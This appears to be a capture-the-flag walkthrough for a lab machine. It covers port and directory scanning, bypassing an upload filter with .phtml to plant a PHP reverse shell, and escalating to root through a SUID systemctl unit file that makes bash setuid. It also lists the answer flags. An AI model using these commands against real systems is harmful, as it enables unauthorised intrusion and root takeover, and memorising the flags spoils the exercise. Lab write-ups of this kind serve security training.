#Task 2 - Reconnaissance 
- Scan the box, how many ports are open?
hint:nmap -sV -sC $IP
6

- What version of the squid proxy is running on the machine?
3.5.12

- How many ports will nmap scan if the flag -p-400 was used?
400

- Using the nmap flag -n what will it not resolve?
DNS

- What is the most likely operating system this machine is running?
ubuntu

- What port is the web server running on?
3333

#Task 3 -  Locating directories using GoBuster

gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
or dir http://<ip?:3333

- What is the directory that has an upload form page?
/internal/

#Task 4  Compromise the webserver
- Try upload a few file types to the server, what common extension seems to be blocked?
.php

- Run this attack, what extension is allowed?
.phtml


#Download shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Edit file php-reverse-shell.php
$ip='<ip>'

Windows: use ncat
ncat -lvpn 1234

- What is the name of the user who manages the webserver?
bill

- What is the user flag?
cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb

#Task 5  Privilege Escalation

find / -perm -u=s -type f 2>/dev/null
find / -type f -user root -perm -4000 -exec ls -l {} + 2> /dev/null
Command Options
-type f : Look only for files
-user root : The owner of the file should be root
-perm 4000 : The file should have at minimum the SUID bit set
-exec : Execute another command on output of find
ls -l {} + : List all the files found by find in long format ({} is placeholder for the location where the find command results will be substituted. The + at the end is used to terminate the command)
Looking at the output we see the systemctl command that is used to run various services on the system. Since this executable has the SUID bit set if we execute an command using systemctl we should get root privileges for that command.

- On the system, search for all SUID files. What file stands out?
/bin/systemctl

First lets find out the directories on the system where we have permission to create files.
find / -type d -writeable -maxdepth 2 2> /dev/null

- Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
Become root and get the last flag (/root/root.txt)

TF2=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
[Install]
WantedBy=multi-user.target' > $TF2
/bin/systemctl link $TF2
/bin/systemctl enable --now $TF2

Now cat root.txt
a58ff8579f0a9270368d33a9966c7fd5

Now how do we become root.
Why not start a shell as root Within this shell
ExecStart=/bin/sh -c "chmod +s /bin/bash"

TF2=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF2
/bin/systemctl link $TF2
/bin/systemctl enable --now $TF2
/bin/bash -p
